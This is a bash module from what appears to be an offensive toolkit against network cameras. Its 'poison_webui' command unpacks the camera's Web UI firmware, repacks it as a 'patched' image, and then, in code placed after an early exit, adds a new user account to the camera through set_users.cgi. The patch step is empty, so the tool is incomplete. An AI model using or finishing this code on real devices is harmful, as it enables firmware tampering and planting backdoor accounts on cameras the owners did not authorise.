#!/bin/bash

# Add command to the array
export CMD_LIST=("${CMD_LIST[@]}" poison_webui)

validate_uiextract()
{
    UIEXTRACT=$(which uiextract)
    [[ -z $UIEXTRACT ]] && die "uiextract not found in \$PATH"
}

validate_uipack()
{
    UIPACK=$(which uipack)
    [[ -z $UIPACK ]] && die "uipack not found in \$PATH"
}


validate_poison_webui()
{
    validate_curl
    validate_lib
    validate_get_users
    validate_uiextract
    validate_uipack
    run_get_users
    get_webui_version
   

    if [[ -z $NEW_USER ]] || [[ -z $NEW_PWD ]]; 
    then
        die "Either username and password for creating new user are missing. Use -h for details"
    fi
}

run_poison_webui()
{    
    validate_poison_webui
    
    TEMPFILE=$(tempfile)

    # Locate Web UI
    WEBUI_FILE=$SYS_FW_LIB/web/$WEBUI_VERSION/$WEBUI_VERSION.bin
    [[ -f $WEBUI_FILE ]] || die "$WEBUI_FILE does not exist. Aborting run_poison_webui"
    green "Found matching Web UI version"
   
    # Verify integrity of Web UI   
    $UIEXTRACT -c $WEBUI_FILE
    [[ $? == 0 ]] || die "Could not verify integrity of $WEBUI_FILE"
    green "Verified the integrity of Web UI"

    # Create temporary directory 
    TMP_WEBUI_ROOT=/tmp/webui$SUFFIX/
    mkdir -p $TMP_WEBUI_ROOT
    ORIG_WEBUI_DIR=$TMP_WEBUI_ROOT/orig

    # Extract webui 
    $UIEXTRACT -x $WEBUI_FILE -o $ORIG_WEBUI_DIR >/dev/null 2>&1
    [[ $? == 0 ]] || die "Could not extract Web UI from $WEBUI_FILE"
    green "Successfully extracted Web UI firmware"
    
    # Patch

    # Pack Web UI and verify integrity  
    NEW_WEBUI_FILE=$TMP_WEBUI_ROOT/new_$WEBUI_VERSION.bin
    $UIPACK -d $ORIG_WEBUI_DIR -o $NEW_WEBUI_FILE
    $UIEXTRACT -c $NEW_WEBUI_FILE
    [[ $? == 0 ]] || die "Could not verify integrity of $NEW_WEBUI_FILE"
    green "Created patched Web UI package"

    exit 0

    # Add user to the camera
    SET_USER_PARAM=$SET_USER_PARAM"user8="$NEW_USER"&pwd8="$NEW_PWD"&pri8=2"
    CODE=$($CURL -s -o  $TEMPFILE -w "%{http_code}" $ADDR'/set_users.cgi?'$SET_USER_PARAM'&user='$USERNAME'&pwd='$PASSWORD)
    
    [[ $CODE == 200 ]] || die "Could not create new user on the camera: $CODE $(cat $TEMPFILE)"
    green "Successfully created a user on the camera"    
}

